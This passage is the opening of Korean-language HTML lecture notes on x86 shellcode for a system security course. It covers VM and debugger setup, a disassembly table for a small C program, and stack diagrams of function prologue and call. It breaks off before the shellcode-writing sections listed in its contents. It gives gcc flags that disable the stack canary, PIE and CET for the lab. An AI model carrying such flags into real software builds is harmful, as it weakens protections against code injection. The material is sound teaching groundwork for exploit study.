@@ -1,0 +1,1415 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>System Security Ch 6: Shellcode — 강의 정리</title>
+<style>
+  :root {
+    --bg: #0a0e1a;
+    --surface: #111827;
+    --surface-2: #1a2235;
+    --surface-3: #232d44;
+    --border: #2d3850;
+    --text: #e5e9f0;
+    --text-dim: #9aa5b8;
+    --text-mute: #6b7488;
+    --accent: #4f8cff;
+    --accent-2: #38bdf8;
+    --green: #34d399;
+    --amber: #fbbf24;
+    --red: #f87171;
+    --purple: #a78bfa;
+    --pink: #f472b6;
+    --code-bg: #0d1322;
+    --code-border: #1e293b;
+    --stack-fill: #1e2a44;
+    --stack-active: #2a3b5e;
+    --reg-fill: #26324d;
+    --shadow: 0 8px 30px rgba(0,0,0,0.45);
+    --mono: 'Menlo', 'Courier New', monospace;
+    --sans: 'Apple SD Gothic Neo', 'Malgun Gothic', sans-serif;
+    --head: 'Impact', 'Arial Narrow', sans-serif;
+  }
+
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+
+  html { scroll-behavior: smooth; scroll-padding-top: 20px; }
+
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: var(--sans);
+    line-height: 1.7;
+    font-size: 16px;
+    -webkit-font-smoothing: antialiased;
+  }
+
+  /* ===== Layout ===== */
+  .layout { display: flex; max-width: 1400px; margin: 0 auto; }
+
+  /* ===== TOC Sidebar ===== */
+  .toc {
+    position: sticky;
+    top: 0;
+    align-self: flex-start;
+    width: 280px;
+    height: 100vh;
+    overflow-y: auto;
+    padding: 28px 18px 60px;
+    border-right: 1px solid var(--border);
+    background: linear-gradient(180deg, #0c1120, #0a0e1a);
+    flex-shrink: 0;
+  }
+  .toc-brand {
+    font-family: var(--head);
+    font-size: 22px;
+    letter-spacing: 1px;
+    color: var(--accent-2);
+    margin-bottom: 4px;
+  }
+  .toc-sub { font-size: 12px; color: var(--text-mute); margin-bottom: 22px; letter-spacing: 0.5px; }
+  .toc a {
+    display: flex;
+    gap: 10px;
+    align-items: baseline;
+    text-decoration: none;
+    color: var(--text-dim);
+    font-size: 13.5px;
+    padding: 7px 10px;
+    border-radius: 7px;
+    border-left: 2px solid transparent;
+    transition: all 0.15s ease;
+    margin-bottom: 2px;
+  }
+  .toc a:hover { background: var(--surface-2); color: var(--text); }
+  .toc a.active {
+    background: var(--surface-3);
+    color: #fff;
+    border-left: 2px solid var(--accent);
+    font-weight: 600;
+  }
+  .toc a .num {
+    font-family: var(--mono);
+    font-size: 11px;
+    color: var(--accent-2);
+    min-width: 20px;
+  }
+  .toc a.active .num { color: var(--accent); }
+
+  /* ===== Main ===== */
+  main { flex: 1; min-width: 0; padding: 40px 48px 120px; }
+
+  .doc-header {
+    margin-bottom: 48px;
+    padding-bottom: 28px;
+    border-bottom: 2px solid var(--border);
+  }
+  .doc-header .eyebrow {
+    font-size: 13px; color: var(--accent-2); letter-spacing: 2px;
+    text-transform: uppercase; margin-bottom: 10px;
+  }
+  .doc-header h1 {
+    font-family: var(--head);
+    font-size: 46px;
+    letter-spacing: 1px;
+    line-height: 1.1;
+    color: #fff;
+    margin-bottom: 14px;
+  }
+  .doc-header .meta {
+    font-size: 14px; color: var(--text-mute);
+    display: flex; gap: 18px; flex-wrap: wrap;
+  }
+  .doc-header .meta span { display: inline-flex; align-items: center; gap: 6px; }
+
+  /* ===== Section ===== */
+  section { margin-bottom: 64px; scroll-margin-top: 20px; }
+  .sec-head { display: flex; align-items: center; gap: 16px; margin-bottom: 24px; }
+  .sec-num {
+    font-family: var(--head);
+    font-size: 30px;
+    color: var(--accent);
+    background: var(--surface-2);
+    border: 1px solid var(--border);
+    border-radius: 12px;
+    padding: 4px 16px;
+    letter-spacing: 1px;
+  }
+  .sec-head h2 {
+    font-family: var(--head);
+    font-size: 30px;
+    letter-spacing: 0.5px;
+    color: #fff;
+  }
+  .sec-divider { height: 2px; background: linear-gradient(90deg, var(--accent), transparent); margin-top: -14px; margin-bottom: 26px; border-radius: 2px; }
+
+  /* ===== Card ===== */
+  .card {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 14px;
+    padding: 24px 26px;
+    margin-bottom: 20px;
+    box-shadow: var(--shadow);
+  }
+  .card h3 {
+    font-size: 19px; color: #fff; margin-bottom: 14px;
+    display: flex; align-items: center; gap: 10px;
+  }
+  .card h3 .tag {
+    font-family: var(--mono); font-size: 12px; font-weight: 400;
+    background: var(--surface-3); color: var(--accent-2);
+    padding: 2px 9px; border-radius: 6px; border: 1px solid var(--border);
+  }
+  .card h4 { font-size: 15.5px; color: var(--accent-2); margin: 18px 0 8px; }
+  .card p { margin-bottom: 10px; color: var(--text); }
+  .card ul { margin: 6px 0 12px 4px; list-style: none; }
+  .card ul li {
+    position: relative; padding-left: 20px; margin-bottom: 7px; color: var(--text);
+  }
+  .card ul li::before {
+    content: "▸"; position: absolute; left: 0; color: var(--accent); font-size: 13px; top: 1px;
+  }
+  .card ul ul { margin: 6px 0 6px 6px; }
+  .card ul ul li::before { content: "·"; color: var(--text-mute); font-size: 18px; top: -3px; }
+
+  .lead { color: var(--text-dim); font-size: 15px; margin-bottom: 18px; }
+
+  /* ===== Code ===== */
+  code.inline {
+    font-family: var(--mono); font-size: 13.5px;
+    background: var(--code-bg); color: var(--accent-2);
+    padding: 1px 7px; border-radius: 5px; border: 1px solid var(--code-border);
+  }
+  pre {
+    background: var(--code-bg);
+    border: 1px solid var(--code-border);
+    border-radius: 10px;
+    padding: 16px 18px;
+    overflow-x: auto;
+    margin: 12px 0 14px;
+    font-family: var(--mono);
+    font-size: 13.5px;
+    line-height: 1.65;
+  }
+  pre code { font-family: var(--mono); color: var(--text); }
+  .c-kw   { color: #c792ea; }
+  .c-reg  { color: #82aaff; }
+  .c-num  { color: #f78c6c; }
+  .c-str  { color: #c3e88d; }
+  .c-com  { color: #5a6680; font-style: italic; }
+  .c-fn   { color: #ffcb6b; }
+  .c-op   { color: #89ddff; }
+  .c-hl   { background: rgba(248,113,113,0.18); border-radius: 3px; }
+
+  /* ===== Two-column card (설명 좌 / 그래프 우) ===== */
+  .split {
+    display: grid; grid-template-columns: 1fr 1fr; gap: 24px; align-items: center;
+  }
+  .split .desc p { font-size: 14.5px; }
+  .svg-wrap { background: var(--surface-2); border: 1px solid var(--border); border-radius: 12px; padding: 14px; }
+  .svg-wrap svg { width: 100%; display: block; }
+  .svg-caption { text-align: center; font-size: 12px; color: var(--text-mute); margin-top: 8px; font-family: var(--mono); }
+
+  /* ===== Table ===== */
+  .tbl-wrap { overflow-x: auto; margin: 10px 0 14px; border-radius: 10px; border: 1px solid var(--border); }
+  table { width: 100%; border-collapse: collapse; font-size: 13.5px; min-width: 520px; }
+  thead th {
+    background: var(--surface-3); color: #fff; text-align: left;
+    padding: 11px 14px; font-weight: 600; border-bottom: 2px solid var(--border);
+  }
+  tbody td { padding: 10px 14px; border-bottom: 1px solid var(--border); color: var(--text); vertical-align: top; }
+  tbody tr:nth-child(even) { background: var(--surface); }
+  tbody tr:last-child td { border-bottom: none; }
+  td.mono, th.mono { font-family: var(--mono); font-size: 12.5px; }
+  .byte { color: var(--red); font-family: var(--mono); }
+  .asm { color: var(--accent-2); font-family: var(--mono); }
+
+  /* ===== Callout ===== */
+  .callout {
+    border-left: 3px solid var(--accent);
+    background: var(--surface-2);
+    border-radius: 0 10px 10px 0;
+    padding: 14px 18px; margin: 14px 0;
+    font-size: 14.5px;
+  }
+  .callout.warn { border-left-color: var(--amber); }
+  .callout.warn::before { content: "⚠ "; color: var(--amber); }
+  .callout.key { border-left-color: var(--green); }
+  .callout.key strong { color: var(--green); }
+  .callout.q { border-left-color: var(--purple); }
+  .callout.q::before { content: "Q. "; color: var(--purple); font-weight: 700; }
+
+  .slide-ref {
+    display: inline-block; font-family: var(--mono); font-size: 11px;
+    color: var(--text-mute); background: var(--code-bg);
+    padding: 1px 7px; border-radius: 4px; border: 1px solid var(--code-border);
+    margin-left: 8px;
+  }
+
+  /* ===== Summary ===== */
+  .summary-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(230px, 1fr)); gap: 16px; }
+  .summary-item {
+    background: var(--surface-2); border: 1px solid var(--border);
+    border-radius: 12px; padding: 18px 20px;
+  }
+  .summary-item .n { font-family: var(--head); font-size: 24px; color: var(--accent); }
+  .summary-item h4 { color: #fff; font-size: 15px; margin: 6px 0; }
+  .summary-item p { font-size: 13px; color: var(--text-dim); margin: 0; }
+
+  footer {
+    margin-top: 60px; padding-top: 24px; border-top: 1px solid var(--border);
+    font-size: 12.5px; color: var(--text-mute); text-align: center;
+  }
+
+  /* SVG shared text styles */
+  text { font-family: 'Apple SD Gothic Neo','Malgun Gothic',sans-serif; }
+  .svg-mono { font-family: 'Menlo','Courier New',monospace; }
+
+  @media (max-width: 1024px) {
+    .toc { display: none; }
+    main { padding: 28px 22px 100px; }
+    .split { grid-template-columns: 1fr; }
+    .doc-header h1 { font-size: 34px; }
+  }
+</style>
+</head>
+<body>
+<div class="layout">
+
+  <!-- ============ TOC ============ -->
+  <nav class="toc">
+    <div class="toc-brand">SHELLCODE</div>
+    <div class="toc-sub">System Security · Ch 6</div>
+    <a href="#s01"><span class="num">01</span><span>개요 &amp; 실습환경</span></a>
+    <a href="#s02"><span class="num">02</span><span>어셈블리어 코드 획득</span></a>
+    <a href="#s03"><span class="num">03</span><span>함수 프롤로그 &amp; 호출 분석</span></a>
+    <a href="#s04"><span class="num">04</span><span>함수 본문 &amp; 에필로그 분석</span></a>
+    <a href="#s05"><span class="num">05</span><span>시스템 콜 처리 과정</span></a>
+    <a href="#s06"><span class="num">06</span><span>IDT &amp; 시스템 콜 종류</span></a>
+    <a href="#s07"><span class="num">07</span><span>Shellcode 개념</span></a>
+    <a href="#s08"><span class="num">08</span><span>어셈블리로 Shellcode 작성</span></a>
+    <a href="#s09"><span class="num">09</span><span>Zero 바이트 제거 기법</span></a>
+    <a href="#s10"><span class="num">10</span><span>Generic Shellcode (2번째 방식)</span></a>
+    <a href="#s11"><span class="num">11</span><span>요약</span></a>
+  </nav>
+
+  <!-- ============ MAIN ============ -->
+  <main>
+    <div class="doc-header">
+      <div class="eyebrow">System Security · Seungsoo Lee · INU CCLAB</div>
+      <h1>Ch 6 : Shellcode</h1>
+      <div class="meta">
+        <span>🖥 Ubuntu 20.04 / x86 32-bit</span>
+        <span>🔧 gcc · gdb · nasm · ld</span>
+        <span>📑 강의 정리 (오프라인 독립 파일)</span>
+      </div>
+    </div>
+
+    <!-- ========= 01 ========= -->
+    <section id="s01">
+      <div class="sec-head"><span class="sec-num">01</span><h2>개요 &amp; 실습환경</h2></div>
+      <div class="sec-divider"></div>
+
+      <div class="card">
+        <h3>강의 목표 <span class="tag">Outline</span></h3>
+        <p class="lead">코드 인젝션 공격에서 주입할 바이너리 코드로 가장 흔히 쓰이는 <strong>Shellcode</strong>를 직접 작성하는 것이 목표다. 이를 위한 전체 흐름은 다음과 같다.</p>
+        <ul>
+          <li><strong>Challenges in writing shellcode</strong> — 쉘코드 작성 시의 제약(특히 NULL 바이트 문제)</li>
+          <li><strong>Two approaches</strong> — 쉘코드를 만드는 두 가지 접근법</li>
+          <li><strong>32-bit Shellcode</strong> — x86 32비트 환경에서의 구현</li>
+        </ul>
+        <span class="slide-ref">slide 2</span>
+      </div>
+
+      <div class="card">
+        <h3>실습환경 <span class="tag">Environment</span></h3>
+        <ul>
+          <li>OS: <code class="inline">Ubuntu 20.04</code></li>
+          <li>Tools: <code class="inline">vscode</code>, <code class="inline">gcc</code>, <code class="inline">gdb</code></li>
+        </ul>
+        <h4>분석 대상 코드 — sample.c</h4>
+        <pre><code><span class="c-kw">void</span> <span class="c-fn">main</span>()
+{
+    <span class="c-kw">int</span> c; c = <span class="c-fn">function</span>(<span class="c-num">1</span>, <span class="c-num">2</span>);
+}
+
+<span class="c-kw">int</span> <span class="c-fn">function</span>(<span class="c-kw">int</span> a, <span class="c-kw">int</span> b)
+{
+    <span class="c-kw">char</span> buffer[<span class="c-num">10</span>];
+    a = a + b;
+    <span class="c-kw">return</span> a;
+}</code></pre>
+        <p class="lead">이 <code class="inline">sample.c</code>의 어셈블리를 한 줄씩 추적하며 스택 동작을 이해하는 것이 03~04절의 핵심이다.</p>
+        <span class="slide-ref">slide 3</span>
+      </div>
+    </section>
+
+    <!-- ========= 02 ========= -->
+    <section id="s02">
+      <div class="sec-head"><span class="sec-num">02</span><h2>어셈블리어 코드 획득</h2></div>
+      <div class="sec-divider"></div>
+
+      <div class="card">
+        <h3>Vscode 원격(SSH) 디버깅 환경 구성 <span class="tag">setup</span></h3>
+        <p class="lead">호스트의 Vscode에서 가상머신(SEED-Ubuntu 20.04)으로 SSH 접속하여 어셈블리를 디스어셈블한다. 핵심 단계만 정리한다.</p>
+        <ul>
+          <li><strong>호스트에 Vscode 설치</strong> (가상머신 내부가 아님)</li>
+          <li><strong>포트 포워딩</strong>: VirtualBox 네트워크 → 포트 포워딩 규칙 (TCP, 호스트 포트 <code class="inline">19001</code> → 게스트 <code class="inline">22</code>)</li>
+          <li><strong>확장 설치</strong>: <code class="inline">Ctrl+Shift+X</code> → "remote" 검색 → <em>Remote – SSH</em> 설치</li>
+          <li><strong>호스트 연결</strong>: <code class="inline">Ctrl+Shift+P</code> → "Remote-SSH: Connect to Host" → <code class="inline">ssh seed@localhost -p 19001</code></li>
+          <li>Linux 선택 → Password 입력 → 원격 접속 성공</li>
+          <li>원격에 <code class="inline">C/C++</code> 및 <code class="inline">Memory View</code> 확장 설치 (<em>Install in SSH: localhost</em>)</li>
+        </ul>
+        <span class="slide-ref">slide 4–14</span>
+      </div>
+
+      <div class="card">
+        <h3>컴파일 옵션 (launch.json / tasks.json) <span class="tag">compile</span></h3>
+        <h4>launch.json — 디스어셈블리 문법 변경</h4>
+        <p>line 21~22를 Intel → <strong>att</strong>로 수정한다.</p>
+        <pre><code>{
+  <span class="c-str">"description"</span>: <span class="c-str">"Set Disassembly Flavor to att"</span>,
+  <span class="c-str">"text"</span>: <span class="c-str">"-gdb-set disassembly-flavor att"</span>,
+  <span class="c-str">"ignoreFailures"</span>: <span class="c-num">true</span>
+}</code></pre>
+
+        <h4>tasks.json — gcc args에 아래 옵션 추가</h4>
+        <pre><code><span class="c-str">"-m32"</span>,                           <span class="c-com">; 32비트 바이너리</span>
+<span class="c-str">"-fmessage-length=0"</span>,
+<span class="c-str">"-fno-stack-protector"</span>,          <span class="c-com">; 스택 카나리 비활성</span>
+<span class="c-str">"-mpreferred-stack-boundary=2"</span>,  <span class="c-com">; 스택 정렬 4바이트</span>
+<span class="c-str">"-fno-pie"</span>,                       <span class="c-com">; PIE 비활성</span>
+<span class="c-str">"-fcf-protection=none"</span>,          <span class="c-com">; CET(endbr) 비활성</span></code></pre>
+        <div class="callout">실습 흐름: <code class="inline">test.c</code> 작성 → line 1에 breakpoint → <strong>Debug C/C++ File</strong> → 화면 우클릭 → <strong>Open Disassembly View</strong> → 어셈블리 확인</div>
+        <span class="slide-ref">slide 15–25</span>
+      </div>
+
+      <div class="card">
+        <h3>획득한 어셈블리 — main &amp; function <span class="tag">att syntax</span></h3>
+        <p class="lead">아래 번호 <code class="inline">&lt;1&gt;</code>~<code class="inline">&lt;18&gt;</code>는 03~04절 스택 분석에서 그대로 사용된다. 실행 순서는 main의 <code class="inline">&lt;1&gt;~&lt;6&gt;</code> → function의 <code class="inline">&lt;7&gt;~&lt;14&gt;</code> → 다시 main의 <code class="inline">&lt;15&gt;~&lt;18&gt;</code> 이다.</p>
+        <div class="tbl-wrap">
+          <table>
+            <thead><tr><th>함수</th><th>#</th><th class="mono">주소</th><th class="mono">기계어</th><th class="mono">어셈블리 (att)</th></tr></thead>
+            <tbody>
+              <tr><td rowspan="6"><strong>main</strong></td><td>&lt;1&gt;</td><td class="mono">...619d</td><td class="mono">55</td><td class="asm">push %ebp</td></tr>
+              <tr><td>&lt;2&gt;</td><td class="mono">...619e</td><td class="mono">89 e5</td><td class="asm">mov %esp,%ebp</td></tr>
+              <tr><td>&lt;3&gt;</td><td class="mono">...61a0</td><td class="mono">83 ec 04</td><td class="asm">sub $0x4,%esp</td></tr>
+              <tr><td>&lt;4&gt;</td><td class="mono">...61a3</td><td class="mono">6a 02</td><td class="asm">push $0x2</td></tr>
+              <tr><td>&lt;5&gt;</td><td class="mono">...61a5</td><td class="mono">6a 01</td><td class="asm">push $0x1</td></tr>
+              <tr><td>&lt;6&gt;</td><td class="mono">...61a7</td><td class="mono">e8 09 00 00 00</td><td class="asm">call ...61b5 &lt;function&gt;</td></tr>
+              <tr><td rowspan="8"><strong>function</strong></td><td>&lt;7&gt;</td><td class="mono">...61b5</td><td class="mono">55</td><td class="asm">push %ebp</td></tr>
+              <tr><td>&lt;8&gt;</td><td class="mono">...61b6</td><td class="mono">89 e5</td><td class="asm">mov %esp,%ebp</td></tr>
+              <tr><td>&lt;9&gt;</td><td class="mono">...61b8</td><td class="mono">83 ec 0c</td><td class="asm">sub $0xc,%esp</td></tr>
+              <tr><td>&lt;10&gt;</td><td class="mono">...61bb</td><td class="mono">8b 45 0c</td><td class="asm">mov 0xc(%ebp),%eax</td></tr>
+              <tr><td>&lt;11&gt;</td><td class="mono">...61be</td><td class="mono">01 45 08</td><td class="asm">add %eax,0x8(%ebp)</td></tr>
+              <tr><td>&lt;12&gt;</td><td class="mono">...61c1</td><td class="mono">8b 45 08</td><td class="asm">mov 0x8(%ebp),%eax</td></tr>
+              <tr><td>&lt;13&gt;</td><td class="mono">...61c4</td><td class="mono">c9</td><td class="asm">leave</td></tr>
+              <tr><td>&lt;14&gt;</td><td class="mono">...61c5</td><td class="mono">c3</td><td class="asm">ret</td></tr>
+              <tr><td rowspan="4"><strong>main</strong></td><td>&lt;15&gt;</td><td class="mono">...61ac</td><td class="mono">83 c4 08</td><td class="asm">add $0x8,%esp</td></tr>
+              <tr><td>&lt;16&gt;</td><td class="mono">...61af</td><td class="mono">89 45 fc</td><td class="asm">mov %eax,-0x4(%ebp)</td></tr>
+              <tr><td>&lt;17&gt;</td><td class="mono">...61b3</td><td class="mono">c9</td><td class="asm">leave</td></tr>
+              <tr><td>&lt;18&gt;</td><td class="mono">...61b4</td><td class="mono">c3</td><td class="asm">ret</td></tr>
+            </tbody>
+          </table>
+        </div>
+        <span class="slide-ref">slide 26</span>
+      </div>
+    </section>
+
+    <!-- ========= 03 ========= -->
+    <section id="s03">
+      <div class="sec-head"><span class="sec-num">03</span><h2>함수 프롤로그 &amp; 호출 분석 &lt;1&gt;–&lt;8&gt;</h2></div>
+      <div class="sec-divider"></div>
+
+      <!-- <1> -->
+      <div class="card">
+        <h3>&lt;1&gt; push %ebp — 최초 ebp 저장</h3>
+        <div class="split">
+          <div class="desc">
+            <ul>
+              <li>최초의 ebp 값을 스택에 저장한다.</li>
+              <li>ebp 바로 전(상위)에는 <code class="inline">ret</code>(return address)가 저장되어 있다. 함수 종료 시 점프할 주소인 <strong>이전 eip 값</strong>이다.</li>
+              <li>ebp는 함수 시작 전의 <strong>기준점(base pointer)</strong>이 된다.</li>
+            </ul>
+            <div class="callout">스택은 상위 주소(0xFFFFFFFF)에서 하위 주소(0x0) 방향으로 <strong>증가</strong>한다. push 시 esp가 감소한다.</div>
+          </div>
+          <div>
+            <div class="svg-wrap">
+              <svg viewBox="0 0 320 300" xmlns="http://www.w3.org/2000/svg">
+                <text x="160" y="18" text-anchor="middle" fill="#9aa5b8" font-size="11">상위 메모리 (0xFFFFFFFF)</text>
+                <!-- cells -->
+                <g font-size="12">
+                  <rect x="70" y="30" width="180" height="40" fill="#1e2a44" stroke="#2d3850"/>
+                  <text x="160" y="55" text-anchor="middle" fill="#e5e9f0">ret (0x00145e37)</text>
+                  <rect x="70" y="70" width="180" height="40" fill="#2a3b5e" stroke="#2d3850"/>
+                  <text x="160" y="95" text-anchor="middle" fill="#fbbf24">최초 ebp 값 (0xbffff458)</text>
+                  <rect x="70" y="110" width="180" height="120" fill="#0d1322" stroke="#2d3850"/>
+                </g>
+                <!-- esp arrow -->
+                <line x1="250" y1="90" x2="292" y2="90" stroke="#38bdf8" stroke-width="2" marker-end="url(#a1)"/>
+                <text x="296" y="94" fill="#38bdf8" font-size="12" class="svg-mono">esp</text>
+                <!-- stack growth arrow -->
+                <line x1="40" y1="40" x2="40" y2="210" stroke="#fbbf24" stroke-width="2" marker-end="url(#a1y)"/>
+                <text x="18" y="130" fill="#fbbf24" font-size="10" transform="rotate(-90 18 130)">스택 증가 방향</text>
+                <text x="160" y="285" text-anchor="middle" fill="#9aa5b8" font-size="11">하위 메모리 (0x00000000)</text>
+                <defs>
+                  <marker id="a1" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto"><path d="M0,0 L6,3 L0,6 Z" fill="#38bdf8"/></marker>
+                  <marker id="a1y" markerWidth="8" markerHeight="8" refX="3" refY="6" orient="auto"><path d="M0,0 L6,0 L3,6 Z" fill="#fbbf24"/></marker>
+                </defs>
+              </svg>
+              <div class="svg-caption">push %ebp 직후의 스택</div>
+            </div>
+          </div>
+        </div>
+        <span class="slide-ref">slide 27</span>
+      </div>
+
+      <!-- <2> -->
+      <div class="card">
+        <h3>&lt;2&gt; mov %esp, %ebp — 프롤로그 완성</h3>
+        <div class="split">
+          <div class="desc">
+            <ul>
+              <li>현재의 esp 값을 ebp 레지스터에 저장한다.</li>
+              <li><code class="inline">push %ebp</code> + <code class="inline">mov %esp,%ebp</code>는 새 함수를 시작할 때마다 항상 수행하는 명령으로, <strong>프롤로그(Prologue)</strong>라 부른다.</li>
+              <li>이 시점에 <code class="inline">ebp == esp</code> 가 되어 둘이 같은 위치를 가리킨다.</li>
+            </ul>
+          </div>
+          <div>
+            <div class="svg-wrap">
+              <svg viewBox="0 0 320 240" xmlns="http://www.w3.org/2000/svg">
+                <text x="160" y="16" text-anchor="middle" fill="#9aa5b8" font-size="11">상위 메모리 (0xFFFFFFFF)</text>
+                <rect x="70" y="26" width="180" height="40" fill="#1e2a44" stroke="#2d3850"/>
+                <text x="160" y="51" text-anchor="middle" fill="#e5e9f0" font-size="12">ret (return address)</text>
+                <rect x="70" y="66" width="180" height="40" fill="#2a3b5e" stroke="#2d3850"/>
+                <text x="160" y="91" text-anchor="middle" fill="#fbbf24" font-size="12">최초 ebp 값</text>
+                <rect x="70" y="106" width="180" height="90" fill="#0d1322" stroke="#2d3850"/>
+                <line x1="28" y1="106" x2="68" y2="106" stroke="#4f8cff" stroke-width="2" marker-end="url(#a2)"/>
+                <text x="4" y="110" fill="#4f8cff" font-size="12" class="svg-mono">ebp</text>
+                <line x1="250" y1="106" x2="292" y2="106" stroke="#38bdf8" stroke-width="2" marker-end="url(#a2b)"/>
+                <text x="296" y="110" fill="#38bdf8" font-size="12" class="svg-mono">esp</text>
+                <text x="160" y="228" text-anchor="middle" fill="#9aa5b8" font-size="11">하위 메모리 (0x00000000)</text>
+                <defs>
+                  <marker id="a2" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto"><path d="M0,0 L6,3 L0,6 Z" fill="#4f8cff"/></marker>
+                  <marker id="a2b" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto"><path d="M0,0 L6,3 L0,6 Z" fill="#38bdf8"/></marker>
+                </defs>
+              </svg>
+              <div class="svg-caption">ebp = esp (프롤로그 완료)</div>
+            </div>
+          </div>
+        </div>
+        <span class="slide-ref">slide 28</span>
+      </div>
+
+      <!-- <3> -->
+      <div class="card">
+        <h3>&lt;3&gt; sub $0x4, %esp — 지역변수 c 할당</h3>
+        <div class="split">
+          <div class="desc">
+            <ul>
+              <li>스택에 4(=0x4)바이트를 할당한다.</li>
+              <li>main의 지역변수 <code class="inline">int c</code> (4바이트)를 위한 공간이다.</li>
+              <li>esp가 4바이트 감소(하위 방향 이동)한다. ebp는 그대로 기준점을 유지한다.</li>
+            </ul>
+          </div>
+          <div>
+            <div class="svg-wrap">
+              <svg viewBox="0 0 320 280" xmlns="http://www.w3.org/2000/svg">
+                <text x="160" y="16" text-anchor="middle" fill="#9aa5b8" font-size="11">상위 (0xFFFFFFFF)</text>
+                <rect x="70" y="26" width="180" height="36" fill="#1e2a44" stroke="#2d3850"/><text x="160" y="49" text-anchor="middle" fill="#e5e9f0" font-size="12">ret (return address)</text>
+                <rect x="70" y="62" width="180" height="36" fill="#1e2a44" stroke="#2d3850"/><text x="160" y="85" text-anchor="middle" fill="#fbbf24" font-size="12">최초 ebp 값</text>
+                <rect x="70" y="98" width="180" height="36" fill="#2a3b5e" stroke="#2d3850"/><text x="160" y="121" text-anchor="middle" fill="#34d399" font-size="12">4 byte 할당 (int c)</text>
+                <rect x="70" y="134" width="180" height="90" fill="#0d1322" stroke="#2d3850"/>
+                <line x1="28" y1="98" x2="68" y2="98" stroke="#4f8cff" stroke-width="2" marker-end="url(#a3)"/><text x="4" y="102" fill="#4f8cff" font-size="12" class="svg-mono">ebp</text>
+                <line x1="250" y1="134" x2="292" y2="134" stroke="#38bdf8" stroke-width="2" marker-end="url(#a3b)"/><text x="296" y="138" fill="#38bdf8" font-size="12" class="svg-mono">esp</text>
+                <text x="160" y="268" text-anchor="middle" fill="#9aa5b8" font-size="11">하위 (0x00000000)</text>
+                <defs>
+                  <marker id="a3" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto"><path d="M0,0 L6,3 L0,6 Z" fill="#4f8cff"/></marker>
+                  <marker id="a3b" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto"><path d="M0,0 L6,3 L0,6 Z" fill="#38bdf8"/></marker>
+                </defs>
+              </svg>
+              <div class="svg-caption">int c 공간 확보</div>
+            </div>
+          </div>
+        </div>
+        <span class="slide-ref">slide 29</span>
+      </div>
+
+      <!-- <4><5> -->
+      <div class="card">
+        <h3>&lt;4&gt; push $0x2 &nbsp;/&nbsp; &lt;5&gt; push $0x1 — 인자 전달</h3>
+        <div class="split">
+          <div class="desc">
+            <ul>
+              <li><code class="inline">&lt;4&gt;~&lt;6&gt;</code>은 <code class="inline">function(1, 2)</code> 호출 루틴이다.</li>
+              <li>cdecl 규약상 인자는 <strong>오른쪽부터</strong> push → 2를 먼저, 1을 나중에 push한다.</li>
+              <li>스택 상단(낮은 주소)에 1, 그 위에 2가 쌓인다.</li>
+            </ul>
+          </div>
+          <div>
+            <div class="svg-wrap">
+              <svg viewBox="0 0 320 320" xmlns="http://www.w3.org/2000/svg">
+                <text x="160" y="16" text-anchor="middle" fill="#9aa5b8" font-size="11">상위 (0xFFFFFFFF)</text>
+                <rect x="70" y="26" width="180" height="34" fill="#1e2a44" stroke="#2d3850"/><text x="160" y="48" text-anchor="middle" fill="#e5e9f0" font-size="11">ret (return address)</text>
+                <rect x="70" y="60" width="180" height="34" fill="#1e2a44" stroke="#2d3850"/><text x="160" y="82" text-anchor="middle" fill="#fbbf24" font-size="11">최초 ebp 값</text>
+                <rect x="70" y="94" width="180" height="34" fill="#1e2a44" stroke="#2d3850"/><text x="160" y="116" text-anchor="middle" fill="#9aa5b8" font-size="11">미사용 (int c)</text>
+                <rect x="70" y="128" width="180" height="34" fill="#2a3b5e" stroke="#2d3850"/><text x="160" y="150" text-anchor="middle" fill="#34d399" font-size="12">2</text>
+                <rect x="70" y="162" width="180" height="34" fill="#2a3b5e" stroke="#2d3850"/><text x="160" y="184" text-anchor="middle" fill="#34d399" font-size="12">1</text>
+                <rect x="70" y="196" width="180" height="70" fill="#0d1322" stroke="#2d3850"/>
+                <line x1="28" y1="94" x2="68" y2="94" stroke="#4f8cff" stroke-width="2" marker-end="url(#a4)"/><text x="4" y="98" fill="#4f8cff" font-size="12" class="svg-mono">ebp</text>
+                <line x1="250" y1="196" x2="292" y2="196" stroke="#38bdf8" stroke-width="2" marker-end="url(#a4b)"/><text x="296" y="200" fill="#38bdf8" font-size="12" class="svg-mono">esp</text>
+                <text x="160" y="308" text-anchor="middle" fill="#9aa5b8" font-size="11">하위 (0x00000000)</text>
+                <defs>
+                  <marker id="a4" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto"><path d="M0,0 L6,3 L0,6 Z" fill="#4f8cff"/></marker>
+                  <marker id="a4b" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto"><path d="M0,0 L6,3 L0,6 Z" fill="#38bdf8"/></marker>
+                </defs>
+              </svg>
+              <div class="svg-caption">인자 1, 2 push 완료</div>
+            </div>
+          </div>
+        </div>
+        <span class="slide-ref">slide 30</span>
+      </div>
+
+      <!-- <6> -->
+      <div class="card">
+        <h3>&lt;6&gt; call 0x565561b5 &lt;function&gt; — 함수 호출</h3>
+        <div class="split">
+          <div class="desc">
+            <ul>
+              <li><code class="inline">call</code>은 내부적으로 <strong>push %eip + jmp 대상주소</strong>를 의미한다.</li>
+              <li>즉, 현재 <code class="inline">%eip</code>값 (다음 명령 주소 <code class="inline">0x565561ac</code>)을 push하고, <code class="inline">%eip</code>를 <code class="inline">0x565561b5</code>로 변경한다.</li>
+              <li>push된 <code class="inline">0x565561ac</code>가 function의 <strong>return address</strong>가 된다.</li>
+            </ul>
+          </div>
+          <div>
+            <div class="svg-wrap">
+              <svg viewBox="0 0 320 340" xmlns="http://www.w3.org/2000/svg">
+                <rect x="70" y="20" width="180" height="32" fill="#1e2a44" stroke="#2d3850"/><text x="160" y="41" text-anchor="middle" fill="#e5e9f0" font-size="11">ret (return address)</text>
+                <rect x="70" y="52" width="180" height="32" fill="#1e2a44" stroke="#2d3850"/><text x="160" y="73" text-anchor="middle" fill="#fbbf24" font-size="11">최초 ebp 값</text>
